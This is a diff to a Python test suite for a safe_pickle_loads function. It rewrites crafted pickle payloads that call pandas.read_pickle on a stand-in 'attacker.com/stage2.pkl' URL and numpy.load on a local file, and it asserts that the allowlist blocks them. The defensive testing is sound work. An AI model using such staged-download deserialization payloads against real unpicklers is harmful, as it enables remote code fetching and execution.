@@ -16120,13 +16120,8 @@ class TestSafePickleLoads:
         allowed_classes = {("builtins", "dict")}
         safe_module_prefixes = {"pandas", "numpy", "sklearn", "scipy"}
 
-        # Stage 1 payload calling pandas.read_pickle
-        url = "http://attacker.com/stage2.pkl"
-        payload = (
-            b"\x80\x04\x8c\x06pandas\x8c\x0bread_pickle\x93"
-            + b"\x8c" + bytes([len(url)]) + url.encode("utf-8")
-            + b"\x85R."
-        )
+        # Stage 1 payload calling pandas.read_pickle (protocol 2 compatible across Python 2 and 3)
+        payload = b"\x80\x02cpandas\nread_pickle\nq\x00(X\x1e\x00\x00\x00http://attacker.com/stage2.pklq\x01tR."
         with pytest.raises(_pickle.UnpicklingError, match="Blocked non-allowlisted callable"):
             safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
 
@@ -16146,12 +16141,7 @@ class TestSafePickleLoads:
         allowed_classes = {("builtins", "dict")}
         safe_module_prefixes = {"pandas", "numpy", "sklearn", "scipy"}
 
-        url = "http://attacker.com/stage2.pkl"
-        payload = (
-            b"\x80\x04\x8c\x10pandas.io.pickle\x8c\x0bread_pickle\x93"
-            + b"\x8c" + bytes([len(url)]) + url.encode("utf-8")
-            + b"\x85R."
-        )
+        payload = b"\x80\x02cpandas.io.pickle\nread_pickle\nq\x00(X\x1e\x00\x00\x00http://attacker.com/stage2.pklq\x01tR."
         with pytest.raises(_pickle.UnpicklingError, match="Blocked non-allowlisted callable"):
             safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
 
@@ -16167,12 +16157,7 @@ class TestSafePickleLoads:
         allowed_classes = {("builtins", "dict")}
         safe_module_prefixes = {"numpy"}
 
-        path = "/tmp/stage2.pkl"
-        payload = (
-            b"\x80\x04\x8c\x05numpy\x8c\x04load\x93"
-            + b"\x8c" + bytes([len(path)]) + path.encode("utf-8")
-            + b"\x85R."
-        )
+        payload = b"\x80\x02cnumpy\nload\nq\x00(X\x0f\x00\x00\x00/tmp/stage2.pklq\x01tR."
         with pytest.raises(_pickle.UnpicklingError, match="Blocked non-allowlisted callable"):
             safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
 
@@ -16183,10 +16168,7 @@ class TestSafePickleLoads:
         safe_module_prefixes = {"_codecs"}
 
         # ("_codecs", "encode") is in _PICKLE_FUNCTION_ALLOWLIST and top_module "_codecs" in safe_module_prefixes
-        payload = (
-            b"\x80\x04\x8c\x07_codecs\x8c\x06encode\x93"
-            b"\x8c\x04test\x85R."
-        )
+        payload = b"\x80\x02c_codecs\nencode\nq\x00(X\x04\x00\x00\x00testq\x01tR."
         result = safe_pickle_loads(payload, allowed_classes, safe_module_prefixes)
         assert result == b"test"
 
